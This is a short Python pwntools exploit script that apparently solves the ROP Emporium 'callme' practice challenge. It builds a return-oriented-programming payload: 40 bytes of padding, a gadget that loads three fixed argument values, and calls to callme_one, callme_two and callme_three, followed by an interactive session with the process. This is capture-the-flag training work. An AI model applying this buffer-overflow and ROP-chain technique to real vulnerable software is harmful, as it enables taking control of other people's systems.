#!/usr/bin/env python3

from pwn import *

elf = ELF('./callme')

context.bits = 64


# usefulFunction addr
usefulFunction = elf.symbols['usefulFunction']

# Dont forget to add usefulGadger
usefulGadget = elf.symbols['usefulGadgets']

log.info(f'usefullgadget addr: {usefulGadget}\n')
deadbeef = p64(0xdeadbeefdeadbeef)
cafebabe = p64(0xcafebabecafebabe)
doodfood = p64(0xd00df00dd00df00d)

log.info(f'deadbeef addr: {deadbeef}\n')
log.info(f'cafebabe addr: {cafebabe}\n')
log.info(f'doodfood addr: {doodfood}\n')

call1 = elf.symbols['callme_one']
call2 = elf.symbols['callme_two']
call3 = elf.symbols['callme_three']

log.info(f'call1 addr: {hex(call1)}\n')
log.info(f'call2 addr: {hex(call2)}\n')
log.info(f'call3 addr: {hex(call3)}\n')
arg = deadbeef + cafebabe + doodfood

payload = flat(
    b'A'*40,
    usefulGadget,
    arg,
    call1,
    usefulGadget,
    arg,
    call2,
    usefulGadget,
    arg,
    call3
)

p = elf.process()

p.sendline(payload)
p.interactive()